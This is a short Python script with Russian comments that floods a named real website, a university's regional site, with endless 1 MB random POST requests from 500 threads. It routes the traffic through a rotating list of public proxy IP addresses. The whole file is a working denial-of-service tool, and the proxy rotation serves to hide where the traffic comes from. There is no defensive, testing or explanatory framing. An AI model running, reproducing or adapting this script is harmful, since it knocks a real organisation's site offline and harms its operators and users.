import requests import threading import random import string # URL вашего сайта url = "https://kaliningrad.mfua.ru/" # Список прокси-серверов proxy_list = [ "http://200.55.249.135:80", "http://182.53.245.241:443", "http://213.197.136.218:1080", "http://23.227.199.108:1080", "http://47.74.9.20:8080", ] # Функция для генерации случайных данных def generate_large_data(size=1024 * 1024): # 1 MB данных return ''.join(random.choices(string.ascii_letters + string.digits, k=size)) # Функция для отправки POST-запроса через прокси def send_post_request(thread_id): while True: try: # Генерация больших данных data = {"payload": generate_large_data()} # Выбор случайного прокси из списка proxy = random.choice(proxy_list) proxies = { "http": proxy, "https": proxy, } # Отправка POST-запроса response = requests.post(url, data=data, proxies=proxies, timeout=10) # Логирование ответа print(f"[Thread {thread_id}] Proxy: {proxy}, Status: {response.status_code}, Response: {response.text}") except Exception as e: print(f"[Thread {thread_id}] Proxy: {proxy}, Ошибка: {e}") # Количество потоков num_threads = 500 # Запуск потоков threads = [] for i in range(num_threads): thread = threading.Thread(target=send_post_request, args=(i,)) threads.append(thread) thread.start() # Ожидание завершения потоков for thread in threads: thread.join()
